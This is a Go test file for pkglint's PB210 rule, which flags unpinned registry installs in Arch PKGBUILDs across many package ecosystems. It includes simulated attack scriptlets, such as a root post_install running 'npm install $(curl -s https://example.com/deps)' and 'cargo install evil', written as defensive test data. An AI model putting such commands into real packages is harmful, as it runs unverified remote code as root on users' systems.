package rules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jmelahman/pkglint/internal/pkgbuild"
)

// adhocFindings lints a PKGBUILD body and returns its PB210 findings.
func adhocFindings(t *testing.T, files map[string]string) []Finding {
	t.Helper()
	var out []Finding
	for _, f := range lint(t, files) {
		if f.RuleID == "PB210" {
			out = append(out, f)
		}
	}
	return out
}

func TestAdhocInstall(t *testing.T) {
	// Each case is one command in the named phase; want is the severity the
	// finding should carry, or -1 for none, and msg a fragment of its text.
	cases := []struct {
		name  string
		body  string
		want  Severity
		msg   string
		other string // another rule that must fire alongside
		not   string // a rule that must not fire
	}{
		// npm and friends
		{"npm install of named packages", "prepare() {\n  npm install axios uuid\n}", Error,
			`npm install fetches "axios", "uuid" at whatever version the npm registry serves at build time and runs their install scripts; install from the project's package.json`, "", "PB206"},
		{"npm install from the manifest is PB206's", "build() {\n  npm install\n}", -1, "", "PB206", ""},
		{"npm ci", "build() {\n  npm ci\n}", -1, "", "", ""},
		{"the guidelines' local tarball idiom", "package() {\n  npm install --cache \"$srcdir/npm-cache\" -g --prefix \"$pkgdir/usr\" \"$srcdir/$pkgname-$pkgver.tgz\"\n}", -1, "", "", "PB206"},
		{"a literal tarball", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" demo-1.0.0.tgz\n}", -1, "", "", ""},
		{"a local directory", "build() {\n  npm install ./vendor/thing file:../other\n}", -1, "", "", ""},
		{"exact version is a warning", "build() {\n  npm install -g typescript@5.4.5\n}", Warn,
			`npm install fetches "typescript@5.4.5" from the npm registry with nothing in the PKGBUILD verifying what arrives and runs its install scripts`, "", ""},
		{"a range is not a pin", "build() {\n  npm install typescript@^5\n}", Error, "at whatever version", "", ""},
		{"a two-part version is a range", "build() {\n  npm install typescript@5.4\n}", Error, "", "", ""},
		{"a scoped exact version", "build() {\n  npm install @angular/cli@17.0.0\n}", Warn, `"@angular/cli@17.0.0"`, "", ""},
		{"a git ref", "build() {\n  npm install github:user/repo\n}", Error, "from a ref nothing pins", "", ""},
		{"a github shorthand", "build() {\n  npm install user/repo#main\n}", Error, "from a ref nothing pins", "", ""},
		{"a full commit pins a ref", "build() {\n  npm install github:user/repo#0123456789abcdef0123456789abcdef01234567\n}", Warn, "", "", ""},
		{"an npm alias", "build() {\n  npm install foo@npm:bar@1.0.0\n}", Warn, "", "", ""},
		{"a package list kept in an array", "_deps=(axios uuid)\nbuild() {\n  npm install \"${_deps[@]}\"\n}", Error, `"axios", "uuid"`, "", ""},
		{"an unresolvable list is still an install by name", "build() {\n  npm install $_deps\n}", Warn,
			`npm install fetches $_deps, which pkglint cannot read; whatever registry package it names arrives at the version the npm registry serves at build time and runs its install scripts; install from the project's package.json`, "", ""},
		{"an unreadable word beside readable ones", "build() {\n  npm install axios \"$_extra\"\n}", Error,
			`npm install fetches "axios" at whatever version the npm registry serves at build time and runs its install scripts; "$_extra" is a word pkglint cannot read; install from`, "", ""},
		{"two unreadable words beside a readable one", "build() {\n  npm install \"$_a\" axios \"$_b\"\n}", Error, `"$_a", "$_b" are words pkglint cannot read`, "", ""},
		{"an expansion is shown as written", "build() {\n  npm install \"${_p:-axios}\"\n}", Warn, `npm install fetches "${_p:-axios}", which pkglint cannot read`, "", ""},
		{"a command substitution is shown as written", "build() {\n  npm install $(cat deps.txt)\n}", Warn, `fetches $(cat deps.txt), which pkglint cannot read`, "", ""},
		{"an unreadable path is local", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" \"$srcdir/$_dir\"\n}", -1, "", "", "PB206"},
		{"an unreadable srcdir is local", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" \"$srcdir\"\n}", -1, "", "", "PB206"},
		{"an unreadable archive is local", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" \"$srcdir\"/*.tgz\n}", -1, "", "", "PB206"},
		{"npm i spelling", "build() {\n  npm i left-pad\n}", Error, "npm i fetches", "", ""},
		{"npm update of a name", "build() {\n  npm update lodash\n}", Error, "", "", ""},
		{"npm install -g of the package itself from the registry", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" \"$pkgname\"\n}", Error, `"demo"`, "", "PB206"},
		{"npm install -g of the package at its version", "package() {\n  npm install -g --prefix \"$pkgdir/usr\" \"$pkgname@$pkgver\"\n}", Warn, `"demo@1.0.0"`, "", "PB206"},
		{"npx of an unreadable tool", "build() {\n  npx \"$_tool\"\n}", Warn, `npx fetches "$_tool", which pkglint cannot read; whatever registry package it names arrives at the version the npm registry serves at build time and runs it`, "PB201", ""},
		{"npx with no manifest fetches", "build() {\n  npx some-tool\n}", Error,
			`npx fetches "some-tool" at whatever version the npm registry serves at build time and runs it`, "PB201", ""},
		{"npx beside npm ci resolves locally", "prepare() {\n  npm ci\n}\nbuild() {\n  npx tsc -p .\n}", -1, "", "", ""},
		{"npx beside a manifest install with flags", "prepare() {\n  npm install --cache \"$srcdir/npm-cache\" --loglevel verbose\n}\nbuild() {\n  npx tsc -p .\n}", -1, "", "", ""},
		{"npx beside pnpm install --frozen-lockfile", "prepare() {\n  pnpm install --frozen-lockfile\n}\nbuild() {\n  npx tsc\n}", -1, "", "", ""},
		{"npx --yes always fetches", "prepare() {\n  npm ci\n}\nbuild() {\n  npx -y tsc\n}", Error, "", "", ""},
		{"npx --no-install never fetches", "build() {\n  npx --no-install tsc\n}", -1, "", "", "PB201"},
		{"npx --package names the package", "build() {\n  npx -p cowsay@1.5.0 cowsay hi\n}", Warn, `"cowsay@1.5.0"`, "", ""},
		{"npm exec", "build() {\n  npm exec -- some-tool\n}", Error, `npm exec fetches "some-tool"`, "", ""},
		{"yarn add", "build() {\n  yarn add left-pad\n}", Error, "yarn add fetches", "", ""},
		{"bare yarn is the manifest", "build() {\n  yarn\n}", -1, "", "PB206", ""},
		{"yarn dlx", "build() {\n  yarn dlx create-foo\n}", Error, "", "", ""},
		{"yarn global add", "build() {\n  yarn global add foo\n}", Error, "", "", ""},
		{"pnpm add", "build() {\n  pnpm add -g foo\n}", Error, "pnpm add fetches", "", ""},
		{"pnpm install from the manifest is PB206's", "build() {\n  pnpm install\n}", -1, "", "PB206", ""},
		{"pnpm install of a name", "build() {\n  pnpm install left-pad\n}", Error, "", "", "PB206"},
		{"pnpm dlx", "build() {\n  pnpm dlx foo\n}", Error, "", "", ""},
		{"pnpx", "build() {\n  pnpx foo\n}", Error, "pnpx fetches", "", ""},
		{"bun add", "build() {\n  bun add foo\n}", Error, "", "", ""},
		{"bunx", "build() {\n  bunx foo\n}", Error, "bunx fetches", "", ""},
		{"bun x", "build() {\n  bun x foo\n}", Error, "bun x fetches", "", ""},

		// Python
		{"pip install of a name", "build() {\n  pip install requests\n}", Error,
			`pip install fetches "requests" at whatever version PyPI serves at build time and runs its build backend; declare the module as a python-* makedepends entry`, "", "PB202"},
		{"pip -r is PB202's", "build() {\n  pip install -r requirements.txt\n}", -1, "", "PB202", ""},
		{"pip install of the project", "build() {\n  pip install .\n}", -1, "", "", ""},
		{"pip exact pin", "build() {\n  pip install requests==2.31.0\n}", Warn, "", "", ""},
		{"pip wildcard pin", "build() {\n  pip install 'requests==2.*'\n}", Error, "", "", ""},
		{"pip range", "build() {\n  pip install 'requests>=2'\n}", Error, "", "", ""},
		{"pip extras with an exact pin", "build() {\n  pip install 'requests[socks]==2.31.0'\n}", Warn, "", "", ""},
		{"pip --no-index", "build() {\n  pip install --no-index --find-links=./wheels foo\n}", -1, "", "", ""},
		{"pip local wheel", "build() {\n  pip install ./dist/foo-1.0-py3-none-any.whl\n}", -1, "", "", ""},
		{"pip3 is pip", "build() {\n  pip3 install requests\n}", -1, "", "", ""},
		{"pipx install", "build() {\n  pipx install evil\n}", Error, `pipx install fetches "evil"`, "", ""},
		{"pipx run", "build() {\n  pipx run black .\n}", Error, `"black"`, "", ""},
		{"uv pip install of a name", "build() {\n  uv pip install requests\n}", Error, "uv pip install fetches", "", "PB202"},
		{"python -m pip install of a name", "build() {\n  python -m pip install requests\n}", Error, "pip install fetches", "PB201", ""},
		{"python -m pip install of the project", "build() {\n  python -m pip install --no-deps .\n}", -1, "", "", "PB201"},
		{"npm install --ignore-scripts runs nothing", "build() {\n  npm install --ignore-scripts axios\n}", Error, "serves at build time; install from", "", ""},
		{"uv pip -r is PB202's", "prepare() {\n  uv pip install -r requirements.txt\n}", -1, "", "PB202", ""},
		{"uv add", "build() {\n  uv add requests\n}", Error, "", "", ""},
		{"uv tool install exact", "build() {\n  uv tool install ruff==0.5.0\n}", Warn, "", "", ""},
		{"uv run --with", "build() {\n  uv run --with rich script.py\n}", Error, `"rich"`, "", ""},
		{"uvx", "build() {\n  uvx ruff check .\n}", Error, `uvx fetches "ruff"`, "", ""},
		{"uvx --from", "build() {\n  uvx --from httpie http\n}", Error, `"httpie"`, "", ""},
		{"poetry add", "build() {\n  poetry add requests\n}", Error, "poetry add fetches", "", "PB209"},

		// Ruby
		{"gem install", "build() {\n  gem install rails\n}", Error,
			`gem install fetches "rails" at whatever version RubyGems serves at build time and builds its native extensions; declare the gem as a ruby-* makedepends entry`, "", "PB208"},
		{"gem install -v", "build() {\n  gem install rails -v 7.1.3\n}", Warn, "", "", ""},
		{"gem install name:version", "build() {\n  gem install rails:7.1.3\n}", Warn, "", "", ""},
		{"gem install -v range", "build() {\n  gem install rails -v '~> 7.1'\n}", Error, "", "", ""},
		{"gem install -v of an unreadable version", "build() {\n  gem install rails -v \"$_railsver\"\n}", Warn, "", "", ""},
		{"gem install of an unreadable name", "build() {\n  gem install \"$_gem\"\n}", Warn,
			`gem install fetches "$_gem", which pkglint cannot read; whatever registry package it names arrives at the version RubyGems serves at build time and builds its native extensions`, "", "PB208"},
		{"gem install --local", "package() {\n  gem install --local demo-1.0.gem\n}", -1, "", "", ""},
		{"gem install of a .gem file", "package() {\n  gem install -N -i \"$pkgdir/usr/lib/ruby/gems\" ./demo-1.0.gem\n}", -1, "", "", ""},

		// Rust
		{"cargo install", "build() {\n  cargo install cargo-audit\n}", Error,
			`cargo install fetches "cargo-audit" at whatever version crates.io serves at build time and runs its build scripts`, "", ""},
		{"cargo install --version", "build() {\n  cargo install --locked cargo-audit --version 0.20.0\n}", Warn, "", "", ""},
		{"cargo install name@version", "build() {\n  cargo install cargo-audit@0.20.0\n}", Warn, "", "", ""},
		{"cargo install --path", "package() {\n  cargo install --path . --root \"$pkgdir/usr\"\n}", -1, "", "", ""},
		{"cargo install --git unpinned", "build() {\n  cargo install --git https://github.com/foo/bar\n}", Error, "from a ref nothing pins", "", ""},
		{"cargo install --git --rev", "build() {\n  cargo install --git https://github.com/foo/bar --rev 0123456789abcdef0123456789abcdef01234567\n}", Warn, "", "", ""},

		// PHP
		{"composer require", "build() {\n  composer require vendor/pkg\n}", Error, "composer require fetches", "", ""},
		{"composer require exact", "build() {\n  composer require vendor/pkg:1.2.3\n}", Warn, "", "", ""},
		{"composer require caret", "build() {\n  composer require 'vendor/pkg:^1.2'\n}", Error, "", "", ""},
		{"composer global require", "build() {\n  composer global require foo/bar\n}", Error, "", "", ""},
		{"composer install is PB207's", "build() {\n  composer install --no-scripts\n}", -1, "", "", ""},

		// Perl
		{"cpanm", "build() {\n  cpanm Module::Name\n}", Error, `cpanm fetches "Module::Name" at whatever version CPAN serves`, "", ""},
		{"cpanm pinned", "build() {\n  cpanm Module::Name@1.2\n}", Warn, "", "", ""},
		{"cpanm local tarball", "build() {\n  cpanm ./Module-Name-1.2.tar.gz\n}", -1, "", "", ""},
		{"cpanm --installdeps .", "build() {\n  cpanm --installdeps .\n}", -1, "", "", ""},
		{"cpan", "build() {\n  cpan Module::Name\n}", Error, "", "", ""},

		// Lua
		{"luarocks install", "build() {\n  luarocks install luasocket\n}", Error, "luarocks install fetches", "", ""},
		{"luarocks install version", "build() {\n  luarocks install luasocket 3.1.0-1\n}", Warn, "", "", ""},
		{"luarocks make", "build() {\n  luarocks make foo-1.0-1.rockspec\n}", -1, "", "", ""},
		{"luarocks install from a local server", "package() {\n  luarocks install --tree \"$pkgdir/usr\" --deps-mode none --only-server \"$srcdir\" luasocket\n}", -1, "", "", ""},
		{"luarocks install from a remote-only server", "build() {\n  luarocks install --only-server https://rocks.example luasocket\n}", Error, "", "", ""},

		// Haskell
		{"cabal install", "build() {\n  cabal install hlint\n}", Error, "cabal install fetches", "", ""},
		{"cabal v2-install versioned", "build() {\n  cabal v2-install hlint-3.8\n}", Warn, "", "", ""},

		// .NET
		{"dotnet tool install", "build() {\n  dotnet tool install -g dotnet-ef\n}", Error, "dotnet tool install fetches", "", ""},
		{"dotnet tool install --version", "build() {\n  dotnet tool install -g dotnet-ef --version 8.0.0\n}", Warn, "", "", ""},
		{"dotnet add package", "build() {\n  dotnet add package Newtonsoft.Json\n}", Error, "", "", ""},
		{"dotnet restore", "build() {\n  dotnet restore --locked-mode\n}", -1, "", "", ""},
		{"nuget install -Version", "build() {\n  nuget install Foo -Version 1.0.0\n}", Warn, "", "", ""},

		// Deno
		{"deno install npm:", "build() {\n  deno install npm:cowsay\n}", Error, "deno install fetches", "", ""},
		{"deno add jsr exact", "build() {\n  deno add jsr:@std/path@1.0.0\n}", Warn, "", "", ""},
		{"deno run versioned url", "build() {\n  deno run https://deno.land/x/foo@1.2.3/mod.ts\n}", Warn, "", "", ""},
		{"deno run unversioned url", "build() {\n  deno run https://deno.land/x/foo/mod.ts\n}", Error, "", "", ""},
		{"deno run local file", "build() {\n  deno run --cached-only main.ts\n}", -1, "", "", ""},
		{"deno run of an unreadable word is a file", "build() {\n  deno run \"$_main\"\n}", -1, "", "", ""},

		// Words pkglint cannot read, across the other ecosystems
		{"pip install of an unreadable name", "build() {\n  pip install \"$_mod\"\n}", Warn, `pip install fetches "$_mod", which pkglint cannot read`, "", "PB202"},
		{"pip install of an unreadable wheel glob", "package() {\n  pip install --no-deps \"$srcdir\"/*.whl\n}", -1, "", "", ""},
		{"uvx --from an unreadable spec", "build() {\n  uvx --from \"$_pkg\" tool\n}", Warn, `uvx fetches "$_pkg", which pkglint cannot read`, "", ""},
		{"cargo install of an unreadable crate", "build() {\n  cargo install \"$_crate\"\n}", Warn, `cargo install fetches "$_crate", which pkglint cannot read`, "", ""},
		{"cargo install of an unreadable path", "build() {\n  cargo install --path \"$srcdir/$_crate\"\n}", -1, "", "", ""},
		{"cpanm of an unreadable module", "build() {\n  cpanm \"$_mod\"\n}", Warn, `cpanm fetches "$_mod", which pkglint cannot read`, "", ""},
		{"cpanm of an unreadable path", "build() {\n  cpanm --installdeps \"$srcdir/$_dist\"\n}", -1, "", "", ""},

		// OCaml, Nim
		{"opam install", "build() {\n  opam install dune\n}", Error, "opam install fetches", "", ""},
		{"opam install versioned", "build() {\n  opam install dune.3.15.0\n}", Warn, "", "", ""},
		{"nimble install", "build() {\n  nimble install nimble\n}", Error, "", "", ""},
		{"nimble install pinned", "build() {\n  nimble install foo@1.2.3\n}", Warn, "", "", ""},
		{"nimble install commit", "build() {\n  nimble install foo@#0123456789abcdef0123456789abcdef01234567\n}", Warn, "", "", ""},

		// Left to other rules
		{"go install is PB204's", "build() {\n  go install example.com/tool@latest\n}", -1, "", "PB204", ""},
		{"bundle install is PB208's", "build() {\n  bundle install\n}", -1, "", "PB208", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			files := map[string]string{"PKGBUILD": pkgbuildWith("", tc.body)}
			got := adhocFindings(t, files)
			ids := ruleIDs(lint(t, files))
			if tc.want < 0 {
				if len(got) != 0 {
					t.Fatalf("want no PB210, got %q", got[0].Message)
				}
			} else {
				if len(got) != 1 {
					t.Fatalf("want one PB210 finding, got %d: %v", len(got), got)
				}
				if got[0].Severity != tc.want {
					t.Errorf("severity %s, want %s: %s", got[0].Severity, tc.want, got[0].Message)
				}
				if !strings.Contains(got[0].Message, tc.msg) {
					t.Errorf("message %q\nwant fragment %q", got[0].Message, tc.msg)
				}
			}
			if tc.other != "" && ids[tc.other] == 0 {
				t.Errorf("expected %s alongside, got %v", tc.other, ids)
			}
			if tc.not != "" && ids[tc.not] != 0 {
				t.Errorf("%s must yield to PB210, got %v", tc.not, ids)
			}
		})
	}
}

// The shape of the 2025 AUR compromises: an install scriptlet, or a
// prepare(), gaining an `npm install` of registry packages. Both are
// reported by PB210 with the concrete remedy, and the scriptlet keeps its
// PB501 critical.
func TestAdhocInstallAttackShape(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("scriptlet npm install", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  cd /tmp
  npm install atomic-lockfile axios cosmiconfig uuid
}`,
		}
		ids := ruleIDs(lint(t, files))
		if ids["PB501"] != 1 || ids["PB210"] != 1 {
			t.Fatalf("want PB501 and PB210 once each, got %v", ids)
		}
		got := adhocFindings(t, files)
		want := `npm install fetches "atomic-lockfile", "axios", "cosmiconfig", "uuid" at whatever version the npm registry serves at install time and runs their install scripts as root; files a package needs belong in package()`
		if got[0].Severity != Error || !strings.Contains(got[0].Message, want) {
			t.Errorf("got %s: %s", got[0].Severity, got[0].Message)
		}
		if filepath.Base(got[0].Path) != "demo.install" || got[0].Line != 3 {
			t.Errorf("finding at %s:%d, want demo.install:3", got[0].Path, got[0].Line)
		}
	})
	t.Run("scriptlet npm install of an unreadable list", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD":     base,
			"demo.install": "post_install() {\n  npm install $(curl -s https://example.com/deps)\n}\n",
		}
		ids := ruleIDs(lint(t, files))
		if ids["PB501"] < 1 || ids["PB210"] != 1 {
			t.Fatalf("want PB501 and one PB210, got %v", ids)
		}
		got := adhocFindings(t, files)
		want := `npm install fetches $(curl -s https://example.com/deps), which pkglint cannot read; whatever registry package it names arrives at the version the npm registry serves at install time and runs its install scripts as root; files a package needs belong in package()`
		if got[0].Severity != Warn || !strings.Contains(got[0].Message, want) {
			t.Errorf("got %s: %s", got[0].Severity, got[0].Message)
		}
	})
	t.Run("scriptlet npx always fetches", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD":     base,
			"demo.install": "post_install() {\n  npx some-tool\n}\n",
		}
		ids := ruleIDs(lint(t, files))
		if ids["PB501"] != 1 || ids["PB210"] != 1 {
			t.Errorf("want PB501 and PB210, got %v", ids)
		}
	})
	t.Run("scriptlet pipx, cpanm and cargo install are network", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD":     base,
			"demo.install": "post_install() {\n  pipx install evil\n  cpanm Evil::Module\n  cargo install evil\n  uvx evil\n}\n",
		}
		ids := ruleIDs(lint(t, files))
		if ids["PB501"] != 4 || ids["PB210"] != 4 {
			t.Errorf("want PB501 and PB210 four times each, got %v", ids)
		}
	})
	t.Run("prepare() npm install of names", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  cd /tmp
  npm install atomic-lockfile axios cosmiconfig uuid
}`)}
		got := adhocFindings(t, files)
		if len(got) != 1 || got[0].Severity != Error {
			t.Fatalf("want one PB210 error, got %v", got)
		}
	})
}

// networkCommands is what PB201, PB501 and PB602 read; the runners and
// installers PB210 knows must be there too, with the same exemptions.
func TestNetworkCommandsCoverInstallers(t *testing.T) {
	cases := map[string]bool{
		"npx tool":                            true,
		"npx --no-install tool":               false,
		"bunx tool":                           true,
		"pnpx tool":                           true,
		"npm exec tool":                       true,
		"npm install-test":                    true,
		"pnpm dlx tool":                       true,
		"yarn dlx tool":                       true,
		"pipx install x":                      true,
		"pipx list":                           false,
		"uvx x":                               true,
		"uvx --offline x":                     false,
		"uv tool run x":                       true,
		"uv sync --offline":                   false,
		"cargo install x":                     true,
		"cargo install --path .":              false,
		"cargo install --offline x":           false,
		"cargo update":                        true,
		"composer require x/y":                true,
		"cpanm X":                             true,
		"cpan X":                              true,
		"luarocks install x":                  true,
		"luarocks list":                       false,
		"cabal install x":                     true,
		"cabal v2-install --offline x":        false,
		"cabal build":                         false,
		"dotnet tool install x":               true,
		"dotnet add package x":                true,
		"dotnet add reference x":              false,
		"dotnet build":                        false,
		"nuget install x":                     true,
		"deno install npm:x":                  true,
		"deno run --cached-only main.ts":      false,
		"deno run main.ts":                    true,
		"opam install x":                      true,
		"nimble install x":                    true,
		"flatpak install x":                   true,
		"snap install x":                      true,
		"gem install x":                       true,
		"gem install --local x.gem":           false,
		"gem update":                          false,
		"python -m pip install x":             true,
		"python3 -m pip install --no-index x": false,
		"python -m venv x":                    false,
		// rsync is a local copy unless an operand names a host.
		`rsync -rtl "${srcdir}/opt/jbr" "${pkgdir}/opt"`: false,
		"rsync -aL out/ out_new/":                        false,
		"rsync -a host:/srv/x ./x":                       true,
		"rsync -a user@host:x ./x":                       true,
		"rsync -a host::module ./x":                      true,
		"rsync -a rsync://mirror/x ./x":                  true,
		"rsync -a -e ssh a/ b/":                          true,
		"rsync -avze ssh a/ b/":                          true,
		`rsync -a "$_src" ./x`:                           true,
	}
	for cmd, want := range cases {
		t.Run(cmd, func(t *testing.T) {
			files := map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  "+cmd+"\n}")}
			ids := ruleIDs(lint(t, files))
			if got := ids["PB201"] > 0; got != want {
				t.Errorf("PB201 for %q: got %v, want %v (%v)", cmd, got, want, ids)
			}
		})
	}
}

func TestScanArgs(t *testing.T) {
	// A --flag=value word records its value; a value flag swallows the next
	// word; a `--` ends flags; an opaque word stays a positional, with the
	// text it was written as kept for the message.
	files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  npm install --prefix=/usr --cache "$srcdir/cache" --loglevel verbose -- ./local axios "$_x"
}`)}
	dir := t.TempDir()
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	ctx := NewContext(pkg)
	var c Command
	for _, cmd := range ctx.CommandsNamed("npm") {
		c = cmd
	}
	s := scanArgs(c, nodeValueFlags)
	if got := strings.Join(s.pos, " "); got != "install ./local axios $_x" {
		t.Errorf("positionals %q", got)
	}
	if got := s.shownAs("$_x"); got != `"$_x"` {
		t.Errorf("shownAs($_x) = %q, want the quoted source", got)
	}
	if got := s.shownAs("axios"); got != "axios" {
		t.Errorf("shownAs(axios) = %q", got)
	}
	if got := s.shownAs("\x00"); got != "…" {
		t.Errorf("shownAs of an unsourced marker = %q", got)
	}
	if got := s.value("--prefix"); len(got) != 1 || got[0] != "/usr" {
		t.Errorf("--prefix values %v", got)
	}
	if got := s.value("--loglevel"); len(got) != 1 || got[0] != "verbose" {
		t.Errorf("--loglevel values %v", got)
	}
	if got := s.value("--cache"); len(got) != 1 || !hasVarRef(got[0]) {
		t.Errorf("--cache should keep its opaque value, got %v", got)
	}
	if !s.has("--prefix") || s.has("--foo") {
		t.Error("has() misreads the flags")
	}
}

// The spec classifiers, one ecosystem's spelling at a time.
func TestAdhocSpecClassifiers(t *testing.T) {
	type want struct {
		ok, pinned, ref bool
	}
	cases := []struct {
		name string
		got  func(string) (registrySpec, bool)
		in   string
		want want
	}{
		{"pip ===", pipSpec, "foo===1.2.3", want{true, true, false}},
		{"pip == with spaces", pipSpec, "foo == 1.2.3", want{true, true, false}},
		{"pip == range list", pipSpec, "foo==1.2,!=1.2.1", want{true, false, false}},
		{"pip direct reference", pipSpec, "foo @ https://example.com/foo.tar.gz", want{true, false, true}},
		{"pip environment marker only", pipSpec, "foo; python_version>'3'", want{true, false, false}},
		{"pip not a requirement", pipSpec, "-not-a-name", want{false, false, false}},
		{"pip junk after the name", pipSpec, "foo/bar", want{false, false, false}},
		{"composer = separator", composerSpec, "vendor/pkg=1.2.3", want{true, true, false}},
		{"composer dev branch", composerSpec, "vendor/pkg:dev-main", want{true, false, false}},
		{"composer no vendor", composerSpec, "pkg", want{false, false, false}},
		{"cabal ==", cabalSpec, "hlint ==3.8", want{true, true, false}},
		{"cabal range", cabalSpec, "hlint >=3", want{true, false, false}},
		{"cabal stray operator", cabalSpec, "hlint>=3", want{false, false, false}},
		{"cabal bare", cabalSpec, "hlint", want{true, false, false}},
		{"named with range chars", func(w string) (registrySpec, bool) { return namedSpec(w, "@", semverExact) }, "foo>=1", want{false, false, false}},
		{"named url", func(w string) (registrySpec, bool) { return namedSpec(w, "@", semverExact) }, "https://example.com/x.git", want{true, false, true}},
		{"npm scoped without version", npmSpec, "@scope/name", want{true, false, false}},
		{"npm malformed", npmSpec, "not a name!", want{false, false, false}},
		{"npm remote tarball", npmSpec, "https://example.com/foo-1.0.0.tgz", want{true, false, true}},
		{"npm git+ssh with commit", npmSpec, "git+ssh://git@github.com/u/r.git#0123456789abcdef0123456789abcdef01234567", want{true, true, true}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			spec, ok := tc.got(tc.in)
			if got := (want{ok, spec.Pinned, spec.Ref}); got != tc.want {
				t.Errorf("%q: got %+v, want %+v", tc.in, got, tc.want)
			}
		})
	}
}

func TestAdhocRunnerAndUvxSpecs(t *testing.T) {
	s := scannedArgs{values: map[string][]string{"--package": {"cowsay@1.5.0"}}}
	if specs := runnerSpecs(s, []string{"cowsay"}); len(specs) != 1 || specs[0].Spec != "cowsay@1.5.0" {
		t.Errorf("--package should name the spec, got %v", specs)
	}
	if specs := runnerSpecs(scannedArgs{values: map[string][]string{}}, nil); specs != nil {
		t.Errorf("no positional, no spec, got %v", specs)
	}
	if specs := uvxSpecs(scannedArgs{values: map[string][]string{}}, nil); specs != nil {
		t.Errorf("uvx with nothing to run names nothing, got %v", specs)
	}
	if specs := denoSpecs([]string{"npm:cowsay", "jsr:@std/path@1.0.0", "$mod", "./main.ts"}); len(specs) != 2 {
		t.Errorf("deno: got %v", specs)
	}
	if manifestInstallIn(nil) {
		t.Error("a nil unit installs no manifest")
	}
}
